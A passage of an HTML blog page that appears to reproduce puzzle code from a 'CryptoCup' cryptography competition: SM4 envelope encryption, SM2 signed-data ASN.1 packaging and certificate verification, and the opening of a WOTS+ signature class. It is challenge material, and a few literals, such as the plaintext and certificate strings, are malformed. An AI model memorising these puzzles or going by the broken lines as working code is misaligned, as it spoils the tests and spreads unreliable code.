class="subst">&#123;sm4_cipherText&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM3参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digestAlgorithm: <span class="subst">&#123;digestAlgorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digest: <span class="subst">&#123;digest&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">&quotquot;</span></span><br><span class="line">    sm2_key = <span class="string">&quot;044f66804d1d30f4499377b96dc8e18faab8300ebddf3eb0fa2065214c260d64c08c6dfe7d9923d6d5baa3a0512a2ede03357c723230ebf77906f82dc1b0fccc1e&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;43d4192f9f74e90543d4192f9f74e905&quot;</span></span><br><span class="line">    asn1_hex_str = sm4_encrypt(<span class="built_in">bytes</span>.fromhex(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>),sm2_key,iv)</span><br><span class="line">    asn1_parse(asn1_hex_str,EnvelopedData())</span><br></pre></td></tr></table></figure><h2 id="初始谜题2"><a href="#初始谜题2" class="headerlink" title="初始谜题2*"></a>初始谜题2*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm2_verify.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> decoder, encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1_modules <span class="keyword">import</span> rfc2459</span><br><span class="line"><span class="keyword">from</span> gmssl.sm2 <span class="keyword">import</span> CryptSM2</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.useful <span class="keyword">import</span> GeneralizedTime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.univ <span class="keyword">import</span> <span class="type">Sequence</span></span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> useful</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECPrimeFieldConfig</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldType&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.840.10045.1.1&#x27;</span>)),  <span class="comment"># Prime field OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;prime&#x27;</span>, univ.Integer()),  <span class="comment"># Prime number p</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECCurveParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientA&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient a</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientB&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient b</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDomainParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Version number (1)</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldParameters&#x27;</span>, ECPrimeFieldConfig()),  <span class="comment"># Field parameters 包含参数oid，p</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;curveParameters&#x27;</span>, ECCurveParameters()),  <span class="comment"># Curve parameters 包含参数a，b</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;basePoint&#x27;</span>, univ.OctetString()),  <span class="comment"># Base point G 基点</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;order&#x27;</span>, univ.Integer()),  <span class="comment"># Order n of base point 参数n</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cofactor&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Cofactor 余因子 固定值为1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignatureValue</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;r&#x27;</span>, univ.Integer()),  <span class="comment"># First part of signature</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;s&#x27;</span>, univ.Integer()),  <span class="comment"># Second part of signature</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        <span class="comment"># version</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer()),</span><br><span class="line">        <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithms&#x27;</span>, univ.ObjectIdentifier()),</span><br><span class="line">        <span class="comment"># 签名值 r, s</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;sm2Signature&#x27;</span>, SM2SignatureValue()),</span><br><span class="line">        <span class="comment"># 曲线参数</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;ecDomainParameters&#x27;</span>, ECDomainParameters()),</span><br><span class="line">        <span class="comment"># 证书</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;certificate&#x27;</span>, univ.OctetString()),</span><br><span class="line">        <span class="comment"># 签名时间</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;timestamp&#x27;</span>, GeneralizedTime()),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入值全部为16进制字符串,g为x，y坐标的16进制字符串进行拼接</span></span><br><span class="line"><span class="comment"># p,a,b,n,g对应曲线参数;r,s为签名值的两部分</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_package</span>(<span class="params">version, oid, signature, curve_params, cert_hex, time_stamp</span>):</span><br><span class="line">    sm2_signed_data = SM2SignedData()</span><br><span class="line">    <span class="comment"># version</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;version&#x27;</span>] = version</span><br><span class="line">    <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>] = oid</span><br><span class="line">    <span class="comment"># 签名值 r, s</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>] = SM2SignatureValue()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;r&#x27;</span>] = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;s&#x27;</span>] = <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>] = ECDomainParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>] = ECPrimeFieldConfig()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>][<span class="string">&quot;prime&quot;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;p&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>] = ECCurveParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientA&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientB&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;basePoint&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;04&#x27;</span> + curve_params[<span class="string">&#x27;g&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;order&#x27;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;certificate&quot;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    dt = datetime.strptime(time_stamp, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    asn1_time_str = dt.strftime(<span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;timestamp&quot;</span>] = GeneralizedTime(asn1_time_str)</span><br><span class="line">    <span class="keyword">return</span> encode(sm2_signed_data).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sm2CertVerifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cert_hex: <span class="built_in">str</span></span>):</span><br><span class="line">        ca_pubkey = <span class="string">&quot;8E1860588D9900C16BD19A0FE0A5ACC600224DBD794FFD34179E03698D52421F46E6D8C6E8AADE512C7B543395AC39C76384726C7F8BA537ABCA0C129ECD9882&quot;</span></span><br><span class="line">        self.sm2_crypt = sm2.CryptSM2(public_key=ca_pubkey, private_key=<span class="literal">None</span>)</span><br><span class="line">        self.cert_tbs, self.signature_bytes, self.cert = self.parse_cert(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_cert</span>(<span class="params">cert_der_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">        cert, _ = decoder.decode(cert_der_bytes, asn1Spec=rfc2459.Certificate())</span><br><span class="line">        tbs = cert.getComponentByName(<span class="string">&#x27;tbsCertificate&#x27;</span>)</span><br><span class="line">        signature_bytes = cert.getComponentByName(<span class="string">&#x27;signatureValue&#x27;</span>).asOctets()</span><br><span class="line">        <span class="keyword">return</span> tbs, signature_bytes, cert</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取签名值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_rs_from_der</span>(<span class="params">self, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        seq, _ = decode(signature, asn1Spec=<span class="type">Sequence</span>())</span><br><span class="line">        r = <span class="built_in">int</span>(seq[<span class="number">0</span>])</span><br><span class="line">        s = <span class="built_in">int</span>(seq[<span class="number">1</span>])</span><br><span class="line">        r_bytes = r.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        s_bytes = s.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r_bytes + s_bytes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, signature: <span class="built_in">bytes</span>, tbs: <span class="built_in">str</span></span>):</span><br><span class="line">        inter_cert_tbs_der = encoder.encode(tbs)</span><br><span class="line">        inter_signature = self.decode_rs_from_der(signature)</span><br><span class="line">        <span class="comment"># 验证签名（tbs_der必须完整，签名必须64字节）</span></span><br><span class="line">        <span class="keyword">return</span> self.sm2_crypt.verify_with_sm3(inter_signature.<span class="built_in">hex</span>(), inter_cert_tbs_der)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_certificate_expiration_date</span>(<span class="params">self, tbs</span>):</span><br><span class="line">        validity = tbs.getComponentByName(<span class="string">&#x27;validity&#x27;</span>)</span><br><span class="line">        not_before = validity.getComponentByName(<span class="string">&#x27;notBefore&#x27;</span>).getComponent()</span><br><span class="line">        not_after = validity.getComponentByName(<span class="string">&#x27;notAfter&#x27;</span>).getComponent()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理 UTCTime 和 GeneralizedTime 两种类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_before, useful.UTCTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_before, useful.GeneralizedTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notBefore time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_after, useful.UTCTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_after, useful.GeneralizedTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notAfter time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        <span class="keyword">return</span> not_before_time &lt;= now &lt;= not_after_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 验证中间证书有效期</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_certificate_expiration_date(self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书已过期或尚未生效&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 验证中间证书签名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.verify_signature(self.signature_bytes, self.cert_tbs):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证书验证未通过&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Config</span>:</span><br><span class="line">    <span class="comment"># sm2参数初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, asn1_str</span>):</span><br><span class="line">        self.sm2_signed_data,asn1_acess = self.hex_to_asn1(asn1_str, SM2SignedData())</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(asn1_acess) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;asn1长度有问题&quot;</span>)</span><br><span class="line">        cert_hex = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;certificate&#x27;</span>])</span><br><span class="line">        sm2_cert_verifier = Sm2CertVerifier(cert_hex)</span><br><span class="line">        valid = sm2_cert_verifier.verify()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;证书验证不通过&quot;</span>)</span><br><span class="line">        g = self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;basePoint&#x27;</span>])</span><br><span class="line">        g = g[<span class="number">2</span>:] <span class="keyword">if</span> g.startswith(<span class="string">&quot;04&quot;</span>) <span class="keyword">else</span> g</span><br><span class="line">        self.ecc_table = &#123;</span><br><span class="line">            <span class="string">&#x27;n&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;p&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;fieldParameters&#x27;</span>][<span class="string">&#x27;prime&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;g&#x27;</span>: g,</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientA&#x27;</span>]),</span><br><span class="line">            <span class="string">&#x27;b&#x27;</span>: self.get_hex_value(self.sm2_signed_data[<span class="string">&#x27;ecDomainParameters&#x27;</span>][<span class="string">&#x27;curveParameters&#x27;</span>][<span class="string">&#x27;coefficientB&#x27;</span>]),</span><br><span class="line">        &#125;</span><br><span class="line">        public_key = self.extract_public_key(sm2_cert_verifier.cert_tbs)</span><br><span class="line">        self.sm2_crypt = CryptSM2(</span><br><span class="line">            private_key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            public_key=public_key,</span><br><span class="line">            ecc_table=self.ecc_table</span><br><span class="line">        )</span><br><span class="line">        self.sign = (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;r&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper() +</span><br><span class="line">                     <span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;sm2Signature&#x27;</span>][<span class="string">&#x27;s&#x27;</span>]).to_bytes(<span class="number">32</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>().upper())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hex_to_asn1</span>(<span class="params">hex_str, asn1_spec</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将16进制字符串转换回ASN.1对象</span></span><br><span class="line"><span class="string">        :param hex_str: 16进制字符串</span></span><br><span class="line"><span class="string">        :param asn1_spec: ASN.1结构定义</span></span><br><span class="line"><span class="string">        :return: ASN.1对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">        der_bytes = binascii.unhexlify(hex_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">        asn1_object, excess = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> asn1_object,excess</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_hex_value</span>(<span class="params">value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;通用转换函数：将 ASN.1 值转换为 16 进制字符串（大写，无前缀）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, univ.Integer):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">format</span>(<span class="built_in">int</span>(value), <span class="string">&#x27;X&#x27;</span>)  <span class="comment"># Integer -&gt; 直接转十六进制</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, univ.OctetString):</span><br><span class="line">            <span class="keyword">return</span> value.asOctets().<span class="built_in">hex</span>().upper()  <span class="comment"># OctetString -&gt; 字节转十六进制</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unsupported type: <span class="subst">&#123;<span class="built_in">type</span>(value)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_public_key</span>(<span class="params">tbs</span>):</span><br><span class="line">        spki = tbs.getComponentByName(<span class="string">&#x27;subjectPublicKeyInfo&#x27;</span>)</span><br><span class="line">        public_key_bitstring = spki.getComponentByName(<span class="string">&#x27;subjectPublicKey&#x27;</span>)</span><br><span class="line">        <span class="comment"># 提取位串内容（包含开头的 0x04）</span></span><br><span class="line">        pubkey_bytes = <span class="built_in">bytearray</span>(public_key_bitstring.asOctets())</span><br><span class="line">        <span class="comment"># 转成十六进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> pubkey_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_misc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">int</span>(self.sm2_signed_data[<span class="string">&#x27;version&#x27;</span>]) != <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>]) != <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span> <span class="keyword">or</span></span><br><span class="line">                <span class="built_in">str</span>(self.sm2_signed_data[<span class="string">&#x27;timestamp&#x27;</span>]) != <span class="string">&quot;20250520101000Z&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2验签</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, data</span>):</span><br><span class="line">        valid = self.verify_misc()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line">        valid = self.sm2_crypt.verify_with_sm3(self.sign, data)</span><br><span class="line">        <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过该函数可以产生一个合法的SM2SignedData</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateSM2SignedDataExample</span>():</span><br><span class="line">    <span class="comment"># 版本</span></span><br><span class="line">    version = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 哈希算法oid</span></span><br><span class="line">    oid = <span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span></span><br><span class="line">    <span class="comment"># 签名值r, s</span></span><br><span class="line">    signature = <span class="string">&#x27;6f8eaff551d0f3fa6de74b75b33e1e58f9fdb4dc58e61c82e11e717ffcf168c4db3d5a90ff3625d12b8b658f8dbab34340c278b412b3aff25489e7feb1c75598&#x27;</span></span><br><span class="line">    r = signature[:<span class="number">64</span>]</span><br><span class="line">    s = signature[<span class="number">64</span>:]</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    curve_params = &#123;</span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;b&quot;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    cert_hex = <span class="string">&#xx27;</span>  <span class="comment"># 证书16进制格式</span></span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    time_stamp = <span class="string">&#x27;2025-05-20 10:10:00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># asn1封装</span></span><br><span class="line">    asn1_package_hex = asn1_package(version, oid, signature, curve_params, cert_hex, time_stamp)</span><br><span class="line">    <span class="keyword">return</span>(asn1_package_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 验签</span></span><br><span class="line">    data = <span class="string">b&quot;Hello, CryptoCup!&quot;</span></span><br><span class="line">    asn1_package_hex = generateSM2SignedDataExample()</span><br><span class="line">    sm2_config = SM2Config(asn1_package_hex)</span><br><span class="line">    result = sm2_config.verify(data)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">待签名消息(字符串):</span></span><br><span class="line"><span class="string">TYTNGLNVKYDLVCGTUYUARFLEFKLAKAZO</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="初始谜题3"><a href="#初始谜题3" class="headerlink" title="初始谜题3"></a>初始谜题3</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_32byte_chunks</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 确保十六进制字符串长度是64的倍数（因为32字节 = 64个十六进制字符）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;十六进制字符串长度必须是64的倍数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每64个字符分割一次，并转换为字节</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">bytes</span>.fromhex(hex_str[i:i + <span class="number">64</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openssl_sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOTSPLUS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        w: <span class="built_in">int</span> = <span class="number">16</span>,  <span class="comment"># Winternitz 参数，控制空间与时间的复杂度</span></span></span><br><span class="line"><span class="params">        hashfunction: <span class="type">Callable</span> = openssl_sha256,  <span class="comment"># 哈希函数</span></span></span><br><span class="line"><span class="params">        digestsize: <span class="built_in">int</span> = <span class="number">256</span>,  <span class="comment"># 摘要大小，单位为比特</span></span></span><br><span class="line"><span class="params">        pubkey: <span class="type">List</span>[<span class="built_in">bytes</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span 